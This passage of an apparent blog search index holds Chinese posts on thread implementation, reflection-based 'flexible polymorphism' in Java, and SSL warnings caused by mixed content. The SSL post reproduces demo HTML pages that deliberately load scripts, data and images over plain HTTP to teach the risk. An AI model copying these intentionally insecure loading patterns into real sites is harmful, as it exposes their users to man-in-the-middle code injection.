一个进程可以包含若干个线程,同属于一个进程的所有线程共享该进程的全部资源。 线程的实现原理进程在 CPU 上实现并发，而 CPU 由操作系统管理。因此进程的实现只能由操作系统内核来进行。但线程就不同了，因为线程隶属进程，除操作系统可以管理线程外，当然也可以由进程直接管理线程。因此线程存在着内核态与用户态两种实现方法。 （1）内核态线程实现。操作系统要管理线程，就要保存线程的有关资料，即将线程控制块（TCB）放在操作系统内核空间。这样，操作系统内核就同时存在进程控制块（PCB）和线程控制块（TCB）。操作系统依据 PCB 和 TCB 提供的信息对线程进行各种类似于进程的管理。操作系统管理线程最重要的优点是：编程简单，因为线程的复杂性由操作系统承担，用户在编程时无须管理线程的调度，即无须担心线程什么时候执行，什么时候阻塞；另一个优点是：如果一个线程阻塞，操作系统可以从容地调度另一个线程执行，因为在内核态下操作系统能够监控所有的线程。内核态的缺点是效率低，因为每次线程切换都要陷入到内核由操作系统来进行调度，而从用户态陷入到内核态是要花费 CPU 时间的。此外，操作系统需要维护线程表，这又要占用内核稀缺的内存资源。 （2）用户态线程实现。用户态如何进行线程调度呢？就是除正常执行任务的线程外，还需要用户自己写一个执行系统，即专门负责线程调度的线程。当运行进程因发生某个等待事件要阻塞自己并进行进程切换时先暂不切换，而是看该进程中是否还有其他线程可以执行。如果有，则将 CPU 控制权交给受阻进程中的执行系统线程，由它来调度受阻进程中另一个可执行的线程占用 CPU 运行。这种做法称为「第二次机会」，即当运行进程要阻塞时，操作系统并不切换到其他进程运行，而是给该进程第二次机会（实际上可以有多次机会）让其继续运行。如果该进程只有一个线程，或该进程的所有线程都已阻塞，这种情况下才切换到其他进程运行。用户态实现的优点是灵活，因为操作系统无须知道线程的存在，所以在任何操作系统都能应用；其次是线程切换快，因为切换仅在用户态进行而无须陷入到内核态（核心态）。用户态实现也有两个缺点：一个缺点是：需要修改操作系统，使其在进程切换时不立即切换到其他进程，而是调用受阻进程中的执行系统线程，但这个缺点因改动范围较小而并不严重；另一个严重的缺点是：操作系统在用户态下，调用受阻进程中的执行系统线程做法违反了软件应遵循的层次架构原则（上层程序调用下层服务），即这种调用是下层功能调用了上层功能（操作系统在下，执行系统线程在上）。 （3）混合式线程实现。鉴于用户态和内核态的线程实现都存在缺陷，所以现代操作系统将二者结合起来使用，称为混合式线程。用户态的执行系统线程负责进程内部线程在非阻塞时的切换；内核态的操作系统则负责阻塞线程的切换，即同时实现内核态和用户态管理。其中内核态线程较少，而用户态线程较多，每个内核态线程可以服务一个或多个用户态线程。在分配线程时，可将需要执行阻塞操作的线程设为内核态线程，而将不会执行阻塞操作的线程设为用户态线程。这样，就可以兼顾内核态和用户态的优点而避免其缺点。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"柔性多态","slug":"柔性多态","date":"2020-09-17T16:00:00.000Z","updated":"2020-10-25T08:29:23.000Z","comments":true,"path":"柔性多态/","link":"","permalink":"https://gschaos.club/%E6%9F%94%E6%80%A7%E5%A4%9A%E6%80%81/","excerpt":"","text":"柔性多态以求圆和长方形面积为例 假设其类图如图 这是个常规的多态程序设计，在子类中重写父类的getArea即可； 但是如果随着时间的变迁，还需要求圆和长方形的周长该如何呢？重新定义一个方法getPerimeter float getPerimeter() 然后再在子类中实现。这势必造成接口及实现模块 客户端程序都需要修改并重新编译。 普通多态编程局限性:如果接口函数内容发生变化,那么相应的各实现子类必须发生变化,导致相关联的各级模块必须重新编程及编译,这即是普通多态编程的局限性 造成这一结果的主要原因是父类 子类定义的多态函数关联过强,消除这种关联性是实现柔性多态功能的关键 修改后的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package design;import java.lang.reflect.Method;import java.util.ArrayList;import java.util.List;/** * author:ycc * @param &lt;T&gt; * 描述： 柔性多态， 在父接口中定义转发方法，子类实现转发，具体转发规则由子类决定。实现增加规则时不需要重新编译接口。 */public interface Polymorphic&lt;T&gt; &#123;//Polymorphic function definition T dispatch(int nID, T in) throws ReflectiveOperationException;&#125;class Flexible&lt;T&gt; implements Polymorphic&lt;T&gt; &#123; private T in; static class Nid &#123; public static List&lt;String&gt; methods = new ArrayList&lt;&gt;(); static String method1 = &quot;method1&quot;; static String method2 = &quot;method2&quot;; static &#123; methods.add(method1); methods.add(method2); &#125; &#125; @Override public T dispatch(int nID, T in) throws ReflectiveOperationException &#123; this.in = in; Method declaredMethod = this.getClass().getDeclaredMethod(Nid.methods.get(nID)); return (T) declaredMethod.invoke(this); &#125; public T method1()&#123; //handler return in; &#125; public T method2()&#123;//handler return in; &#125; public static void main(String[] args)throws Exception &#123; Polymorphic polymorphicNonT = new Flexible(); Float dispatch = (Float) polymorphicNonT.dispatch(1, 1.0f); System.out.println(dispatch); Polymorphic&lt;FlexibleBean&gt; polymorphicHasT = new Flexible&lt;&gt;(); FlexibleBean dispatch1 = polymorphicHasT.dispatch(0, new FlexibleBean()); System.out.println(dispatch1); &#125;&#125;class FlexibleBean&#123; private int id; private String name; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;FlexibleBean&#123;&quot; + &quot;id=&quot; + id + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 在上面改写中，接口中的内容不变，而子类重写dispatch仅起到转发的作用，具体转发的函数是非多态函数。如果再需要一个方法就可以在子类中定义个方法，而接口无需再次编译。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"设计模式","slug":"设计模式","permalink":"https://gschaos.club/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"为什么部署SSL证书后还是提示不安全","slug":"为什么部署SSL证书后，还是提示不安全","date":"2020-09-08T16:00:00.000Z","updated":"2020-11-03T08:11:45.000Z","comments":true,"path":"为什么部署SSL证书后，还是提示不安全/","link":"","permalink":"https://gschaos.club/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%83%A8%E7%BD%B2SSL%E8%AF%81%E4%B9%A6%E5%90%8E%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8F%90%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/","excerpt":"很多朋友可能都会遇到这个让人抓狂的问题：为什么按要求部署SSL证书了，但访问网站时还是会出现不安全的提示？这里就和大家一起来看看可能导致这个问题的原因和解决方法。","text":"很多朋友可能都会遇到这个让人抓狂的问题：为什么按要求部署SSL证书了，但访问网站时还是会出现不安全的提示？这里就和大家一起来看看可能导致这个问题的原因和解决方法。 为什么部署SSL证书后，还是提示不安全很多朋友可能都会遇到这个让人抓狂的问题：为什么按要求部署SSL证书了，但访问网站时还是会出现不安全的提示？这里必盛云就和大家一起来看看可能导致这个问题的原因和解决方法。 首先我们来看看为什么会出现不安全提示： 当我们访问一个已安装SSL证书的网站页面时，如果页面出现”您的连接不是私密链接“或”此网页含有不安全的内容“等类似的错误提示，这说明浏览器检查到你当前所访问的HTTPS网站的SSL证书出现问题了，存在访问风险，所以提示用户“此站点不安全”。 那么这个问题是怎么出现的呢？要怎样才能解决呢？请看下面的分析： 域名不匹配HTTPS网站其中一个非常重要的作用，就是确认网站的身份。这样就能非常有效地预防DNS劫持。一张SSL证书必须对应一个网站域名，当你访问的网站域名和SSL证书中设置的域名不一致时，浏览器就会提示用户网站不安全。可能是由于配置错误导致SSL证书与网站域名不配置，也可能因为多个域名都能使用同一张SSL证书，导致域名与SSL证书不匹配。 此种情况下，需要站长确认域名与所部署的SSL证书是否相匹配，如不匹配需及时替换为正确的证书。 证书到期这个原因非常好理解，即您的SSL证书到期需要续费重新申请了； SSL证书过期也是导致出现错误的原因之一。一般SSL证书的有效期为1~2年，当证书过期后，就必须要更新证书，HTTPS网站才能继续正常工作。否则过了有效期就会提示错误。可能有的站长管理很多网站，在证书到期之后重新安装会非常耗时，希望申请证书的有效期能长一点，但从CA（Certificate Authority证书颁发机构）的角度来看，设置证书有效期是非常有必要的。 首先是为了安全考虑，CA机构不能保证一个网站永远是合法的，因此它需要定期检查网站。其次，涉及到证书吊销。当网站的私钥丢失时，网站应该向CA申请将他们的证书加入到证书吊销列表（CRL）里。当用户访问https站点时，浏览器会自动向CA请求吊销列表，如果用户访问的站点提供的证书在CRL里，浏览器就不信任这个证书，因为攻击者可能拥有同样的证书。所以如果证书永久有效，随着越来越多的私钥丢失，吊销列表也越来越大，因为只有加进去的，没有剔出去的，这既给CA增加流量压力，也会增加浏览器的流量。而一旦有效期只有几年，那么CA就可以将那些已经过期了的证书从CRL里剔除，因为反正浏览器也不信任过期证书。 系统时间错误另外一个常见的原因，是客户端的系统时间错误。浏览器会判断SSL证书是否过期，而浏览器的时间判断是依照你的系统时间。假如你的系统时间不正确，那么很有可能浏览器就会出现误判的情况，导致一张还没过期的SSL证书被认为是过期了。最终页面显示错误提示。解决办法也非常简单，修改您的系统时间为正确的就可以了。 不受信任的SSL证书一些站长或者个人站长由于经费上的预算有限，又恰好懂得一些代码，自己制作出一张自签名的SSL证书或向一些SSL证书服务商申请不受信任的SSL证书。但现在浏览器对SSL证书的管理也更加严格，这些使用自签名SSL证书或不受信任的SSL证书部署的网站是不被浏览器信任的，所以访问时仍然会出现错误提示。因为自签名证书或小型SSL证书并不在操作系统的可信任根证书之中。只有是由受信任根证书所签发出来的SSL证书，浏览器才会认为是安全的，其他的SSL证书浏览器一律都会提示错误。 站内调用非HTTPS素材站内调用非HTTPS素材包括图文、CSS、js等素材。出现这种情形时，一般在浏览器安全锁处会看到锁出现了一个三角形图形，点击查看SSL证书详细信息能看到有感叹号说明。下面我们就来看看如何解决这一问题： 首先您可以通过按住键盘上的F12键进入开发者模式，或者鼠标放在页面空白处点击右键后选择“查看网页源代码”，之后就可以在右侧边框找是哪些非安全链接导至整个网站不被信任。 查看上图中找到的两个链接，的确是http的素材路径。 那么现在我们需要做的就是检查这两个链接是否为有用链接；如果这个链接没有什么作用，删掉也不会对网站有任何影响，那么直接删除就行了。然后继续检查直至清除所有无用的非安全链接。完成清理后，再清除浏览器缓存，则可以看到网站已经重新被浏览器信任了。 现在再来看看第二种情况，如果这个元素或图片/CSS/JS是对网站极为重要的内容，绝对不可以删除。此时，则只需把源站的非安全素材的路径由绝对路径放置在本站文件夹变成相对路径。 什么是混合内容？混合内容在以下情况下出现：初始 HTML 内容通过安全的 HTTPS 连接加载，但其他资源（例如，图像、视频、样式表、脚本）则通过不安全的 HTTP 连接加载。之所以称为混合内容，是因为同时加载了 HTTP 和 HTTPS 内容以显示同一个页面，且通过 HTTPS 加载的初始请求是安全的。现代浏览器会针对此类型的内容显示警告，以向用户表明此页面包含不安全的资源。 TL;DR HTTPS 对于保护您的网站和用户免受攻击非常重要。 混合内容会降低您的 HTTPS 网站的安全性和用户体验。 资源请求和网络浏览器当浏览器访问网站的页面时，它将请求 HTML 资源。然后，网络服务器返回 HTML 内容，浏览器进行解析并显示给用户。通常，一个 HTML 文件不足以显示一个完整页面，因此，HTML 文件包含浏览器需要请求的其他资源的引用。这些子资源可以是图像、视频、额外 HTML、CSS 或 JavaScript 之类的资源；每个资源均使用单独的请求获取。 HTTPS 的优势当浏览器通过 HTTPS（HTTP Secure 的缩写形式）请求资源时，它使用一个已加密连接与网络服务器进行通信。 使用 HTTPS 有三个主要优势： 身份验证 数据完整性 保密性 身份验证我正在访问的网站是正确的吗？ HTTPS 让浏览器检查并确保其已打开正确的网站，并且没有被重定向到恶意的网站。 当导航到您的银行网站时，您的浏览器对该网站进行身份验证，从而防止攻击者冒充您的银行窃取您的登录凭据。 数据完整性是否有人篡改我正在发送或接收的内容？ HTTPS 让浏览器检测是否有攻击者更改了浏览器接收的任何数据。 使用您的银行网站转账时，这样做可防止当您的请求在传输中时攻击者更改目标帐号。 保密性是否有人能看到我正在发送或接收的内容？ HTTPS 可防止攻击者窃取浏览器的请求，跟踪访问的网站或窃取已发送或接收的信息。 HTTPS、传输层安全协议 (TLS) 和 SSLHTTPS 是 HTTP Secure 的缩写，即超文本传输安全协议。此处的 secure 部分来自于添加到浏览器发送和接收的请求的加密。目前大多数浏览器都使用传输层安全协议 (TLS) 提供加密；TLS 有时称为 SSL。 Wikipedia HTTPS Wikipedia TLS 可汗学院 (Khan Academy) 的加密课程 高性能浏览器网络（作者：Ilya Grigorik）中的传输层安全协议 (TLS) 章节 混合内容会降低 HTTPS 的安全性使用不安全的 HTTP 协议请求子资源会降低整个页面的安全性，因为这些请求容易受到中间人攻击，攻击者窃听网络连接，查看或修改双方的通信。通过使用这些资源，攻击者通常可以完全控制页面，而不只是泄露的资源。 尽管许多浏览器向用户报告混合内容警告，但出现警告时为时已晚：不安全的请求已被执行，且页面的安全性被破坏。遗憾的是，这种情况在网络中很普遍，正因如此，浏览器不能简单地阻止所有混合请求，否则将会限制许多网站的功能。 混合内容：页面已通过 HTTPS 加载，但请求了不安全的图像。此内容也应通过 HTTPS 提供。 一个简单的示例从 HTTPS 页面加载不安全的脚本。 查看通过 HTTPS—https://googlesamples.github.io/web-fundamentals/…/simple-example.html加载的此示例页面 — 添加一个 HTTP 脚本标记，其尝试加载混合内容。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt; &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; body &#123; margin: 2em; &#125; &lt;&#x2F;style&gt; &lt;title&gt;Simple mixed content example&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div role&#x3D;&quot;main&quot;&gt; &lt;h1&gt; Simple mixed content example! &lt;&#x2F;h1&gt; &lt;p&gt; View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; This page loads the script simple-example.js using HTTP. This is the simplest case of mixed content. When the simple-example.js file is requested by the browser, an attacker can inject code into the returned content and take control of the entire page. Thankfully, most modern browsers block this type of dangerous content by default and display an error in the JavaScript console. This can be seen when the page is viewed over HTTPS. &lt;&#x2F;p&gt; &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for insecure script to run...&lt;&#x2F;div&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;simple-example.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;div&gt; &lt;script&gt; (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D; function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date; e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0]; e.src&#x3D;&#39;https:&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;; r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;)); ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;); var isCompleted &#x3D; &#123;&#125;; function sampleCompleted(sampleName)&#123; if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123; ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); isCompleted[sampleName] &#x3D; true; &#125; &#125;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 试一下 在此示例中，使用一个 HTTP 网址加载脚本 simple-example.js。这是最简单的混合内容案例。浏览器请求 simple-example.js 文件时，攻击者可以将代码注入返回的内容，并控制整个页面。 幸运的是，大多数现代浏览器均默认阻止此类危险的内容。 请参阅具有混合内容的浏览器行为。 混合内容：页面已通过 HTTPS 加载，但请求了不安全的脚本。此请求已被阻止，内容必须通过 HTTPS 提供。 一个 XMLHttpRequest 示例通过 XMLHttpRequest 加载不安全的数据。 查看通过 HTTPS—https://googlesamples.github.io/web-fundamentals/…/xmlhttprequest-example.html 加载的此示例页面 — 添加一个通过 HTTP 加载的XMLHttpRequest，以获取混合内容 JSON 数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt; &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; body &#123; margin: 2em; &#125; &lt;&#x2F;style&gt; &lt;title&gt;XMLHttpRequest mixed content example&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div role&#x3D;&quot;main&quot;&gt; &lt;h1&gt; XMLHttpRequest mixed content example! &lt;&#x2F;h1&gt; &lt;p&gt; View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;xmlhttprequest-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; This page constructs an HTTP URL dynamically in JavaScript, the URL is eventually used to load an insecure resource by XMLHttpRequest. When the xmlhttprequest-data.js file is requested by the browser, an attacker can inject code into the returned content and take control of the entire page. Thankfully, most modern browsers block this type of dangerous content by default and display an error in the JavaScript console. This can be seen when the page is viewed over HTTPS. &lt;&#x2F;p&gt; &lt;div id&#x3D;&quot;output&quot;&gt;Waiting for data...&lt;&#x2F;div&gt; &lt;script&gt; var rootUrl &#x3D; &#39;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#39;; var resources &#x3D; &#123; jsonData: &#39;&#x2F;xmlhttprequest-data.js&#39; &#125;; var request &#x3D; new XMLHttpRequest(); request.addEventListener(&#39;load&#39;, function() &#123; var jsonData &#x3D; JSON.parse(request.responseText); document.getElementById(&#39;output&#39;).innerHTML +&#x3D; &#39;&lt;br&gt;&#39; + jsonData.data; &#125;); request.open(&#39;GET&#39;, rootUrl + resources.jsonData, true); request.send(); &lt;&#x2F;script&gt; &lt;&#x2F;div&gt; &lt;script&gt; (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D; function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date; e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0]; e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;; r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;)); ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;); var isCompleted &#x3D; &#123;&#125;; function sampleCompleted(sampleName)&#123; if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123; ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); isCompleted[sampleName] &#x3D; true; &#125; &#125;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 试一下 下面的 HTTP 网址是在 JavaScript 中动态构建的，并且最终被 XMLHttpRequest 用于加载不安全的资源。 与上面简单的示例相似，当浏览器请求 xmlhttprequest-data.js 文件时，攻击者可以将代码注入返回的内容中，并控制整个页面。 大多数现代浏览器也会阻止这些危险的请求。 混合内容：页面已通过 HTTPS 加载，但请求了不安全的 XMLHttpRequest 端点。此请求已被阻止，内容必须通过 HTTPS 提供。 图像库示例使用 jQuery 灯箱加载不安全的图像。 查看通过 HTTPS—https://googlesamples.github.io/web-fundamentals/…/image-gallery-example.html 加载的此示例页面时 — 最初没有任何混合内容问题；但是当点击缩略图时，将通过 HTTP 加载完整尺寸的混合内容图像。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;icon?family&#x3D;Material+Icons&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.indigo-pink.min.css&quot;&gt; &lt;script defer src&#x3D;&quot;https:&#x2F;&#x2F;code.getmdl.io&#x2F;1.2.1&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; body &#123; margin: 2em; &#125; &lt;&#x2F;style&gt; &lt;title&gt;Image gallery mixed content example&lt;&#x2F;title&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;external_hosted&#x2F;jquery2.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; $(function() &#123; $(&#39;.gallery&#39;).click(function(e) &#123; e.preventDefault(); $(&#39;.overlay-foreground&#39;).css(&#39;background-image&#39;, &#39;url(&#39; + $(this).attr(&#39;href&#39;) + &#39;)&#39;); $(&#39;.overlay&#39;).fadeIn(&#39;slow&#39;); &#125;) $(&#39;.overlay&#39;).click(function() &#123; $(&#39;.overlay&#39;).fadeOut(&#39;slow&#39;); &#125;) &#125;); &lt;&#x2F;script&gt; &lt;style&gt; .overlay &#123; position: fixed; top: 0; left: 0; width: 100%; height: 100%; &#125; .overlay-background &#123; background-color: #000; filter:alpha(opacity&#x3D;80); -moz-opacity: 0.8; -khtml-opacity: 0.8; opacity: 0.8; z-index: 10000; &#125; .overlay-foreground &#123; background-position: center center; background-repeat: no-repeat; z-index: 10001; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div role&#x3D;&quot;main&quot;&gt; &lt;h1&gt; Image gallery mixed content! &lt;&#x2F;h1&gt; &lt;p&gt; View page over: &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;HTTP&lt;&#x2F;a&gt; - &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;image-gallery-example.html&quot;&gt;HTTPS&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; Image galleries often rely on the &lt;img&gt; tag src attribute to display thumbnail images on the page, the anchor ( &lt;a&gt; ) tag href attribute is then used to load the full sized image for the gallery overlay. Normally &lt;a&gt; tags do not cause mixed content, but in this case the jQuery code overrides the default link behavior &amp;mdash; to navigate to a new page &amp;mdash; and instead loads the HTTP image on this page. While this content isn&#39;t blocked, modern browsers display a warning in the JavaScript console. This can be seen when the page is viewed over HTTPS and the thumbnail is clicked. &lt;&#x2F;p&gt; CLICK ME! --&gt; &lt;a class&#x3D;&quot;gallery&quot; href&#x3D;&quot;http:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy.jpg&quot;&gt; &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;googlesamples.github.io&#x2F;web-fundamentals&#x2F;fundamentals&#x2F;security&#x2F;prevent-mixed-content&#x2F;puppy-thumb.jpg&quot;&gt; &lt;&#x2F;a&gt; &lt;div class&#x3D;&quot;overlay overlay-background&quot; style&#x3D;&quot;display: none;&quot;&gt;&lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;overlay overlay-foreground&quot; style&#x3D;&quot;display: none;&quot;&gt;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;script&gt; (function(b,o,i,l,e,r)&#123;b.GoogleAnalyticsObject&#x3D;l;b[l]||(b[l]&#x3D; function()&#123;(b[l].q&#x3D;b[l].q||[]).push(arguments)&#125;);b[l].l&#x3D;+new Date; e&#x3D;o.createElement(i);r&#x3D;o.getElementsByTagName(i)[0]; e.src&#x3D;&#39;&#x2F;&#x2F;www.google-analytics.com&#x2F;analytics.js&#39;; r.parentNode.insertBefore(e,r)&#125;(window,document,&#39;script&#39;,&#39;ga&#39;)); ga(&#39;create&#39;,&#39;UA-52746336-1&#39;);ga(&#39;send&#39;,&#39;pageview&#39;); var isCompleted &#x3D; &#123;&#125;; function sampleCompleted(sampleName)&#123; if (ga &amp;&amp; !isCompleted.hasOwnProperty(sampleName)) &#123; ga(&#39;send&#39;, &#39;event&#39;, &#39;WebCentralSample&#39;, sampleName, &#39;completed&#39;); isCompleted[sampleName] &#x3D; true; &#125; &#125;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 试一下 图像库通常依靠 &lt;img&gt; 标记 src 属性在页面上显示缩略图，然后，使用定位 (&lt;a&gt;) 标记 href 属性为图像库叠加层加载完整尺寸的图像。正常情况下，&lt;a&gt; 标记不会产生混合内容，但在此例中，jQuery 代码替换默认链接行为（导航到新页面），改为在此页面上加载 HTTP 图像。 混合内容：页面已通过 HTTPS 加载，但请求了不安全的图像。此内容也应通过 HTTPS 提供。 不安全的图像会降低网站的安全性，但是它们的危险性与其他类型的混合内容不一样。 现代浏览器仍会加载混合内容图像，但也会向用户显示警告。 混合内容类型与相关安全威胁混合内容有两种：主动混合内容和被动混合内容 被动混合内容指的是不与页面其余部分进行交互的内容，从而使中间人攻击在拦截或更改该内容时能够执行的操作受限。被动混合内容包括图像、视频和音频内容，以及无法与页面其余部分进行交互的其他资源。 主动混合内容作为整体与页面进行交互，并且几乎允许攻击者对页面进行任何操作。 主动混合内容包括浏览器可下载和执行的脚本、样式表、iframe、flash 资源及其他代码。 被动混合内容被动混合内容仍会给您的网站和用户带来安全威胁。 例如，攻击者可以拦截针对网站上的图像的 HTTP 请求，调换或更换这些图像；此攻击者可以调换“save and delete”按钮图像，导致您的用户无意间删除内容；将您的产品图表更换为下流或淫秽内容，从而损害您的网站；或将您的产品图像更换为不同网站或产品的广告。 即使攻击者不改变您的网站内容，您仍面临严重的隐私问题，攻击者可以使用混合内容请求跟踪用户。攻击者可以基于浏览器加载的图像或其他资源了解用户访问哪些页面，以及查看了哪些产品。 以下是被动混合内容的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;link 